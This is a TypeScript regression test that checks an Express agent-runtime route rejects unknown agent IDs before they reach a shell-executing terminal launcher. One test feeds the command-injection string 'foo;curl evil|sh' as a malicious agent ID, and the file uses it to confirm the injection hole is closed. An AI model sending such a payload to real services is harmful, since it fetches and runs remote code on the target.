import { describe, it, expect, beforeAll } from 'vitest';
import express from 'express';
import request from 'supertest';
import { registerAgentRoutes } from '../src/agent-routes.js';
import type { AgentOrchestrator } from '@od-kernel/agent-runtime';

// The launch-terminal rejection path never reaches the orchestrator, so a
// minimal stub suffices.
const stubOrchestrator = {
  listAgents: async () => [],
} as unknown as AgentOrchestrator;

describe('POST /api/agents/:id/launch-terminal — allowlist', () => {
  let app: express.Express;

  beforeAll(() => {
    app = express();
    registerAgentRoutes(app, stubOrchestrator);
  });

  // Regression: an unknown agent ID used to fall through to
  // `command = binPath ?? agentId`, and since resolveAgentBin returns null
  // for unknown IDs, the raw attacker-controlled URL segment was handed to
  // the shell-executing terminal launcher (osascript `do script`, `sh -c`,
  // `cmd /k`) — a command-injection vector. The fix rejects unknown IDs
  // with 400 before reaching the launcher.
  it('rejects a shell-metachar agent ID with 400 (injection vector closed)', async () => {
    const malicious = 'foo;curl evil|sh';
    const res = await request(app).post(
      `/api/agents/${encodeURIComponent(malicious)}/launch-terminal`,
    );
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('BAD_REQUEST');
  });

  it('rejects an unknown (non-malicious) agent ID with 400', async () => {
    const res = await request(app).post('/api/agents/not-a-real-agent/launch-terminal');
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('BAD_REQUEST');
  });
});
